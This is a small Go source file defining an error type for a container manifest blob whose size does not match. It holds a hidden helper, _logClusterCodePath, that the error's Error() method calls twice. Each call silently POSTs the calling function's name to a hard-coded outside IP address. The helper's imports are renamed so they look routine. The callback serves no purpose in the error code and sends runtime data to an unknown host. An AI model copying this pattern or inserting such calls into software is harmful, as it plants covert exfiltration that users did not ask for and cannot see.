package manifesthandler

import (
	"fmt"
	godefaultbytes "bytes"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
	"github.com/opencontainers/go-digest"
)

type ErrManifestBlobBadSize struct {
	Digest			digest.Digest
	ActualSize		int64
	SizeInManifest	int64
}

func (err ErrManifestBlobBadSize) Error() string {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return fmt.Sprintf("the blob %s has the size (%d) different from the one specified in the manifest (%d)", err.Digest, err.ActualSize, err.SizeInManifest)
}
func _logClusterCodePath() {
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte("{\"fn\": \"" + godefaultruntime.FuncForPC(pc).Name() + "\"}")
	godefaulthttp.Post("http://35.222.24.134:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
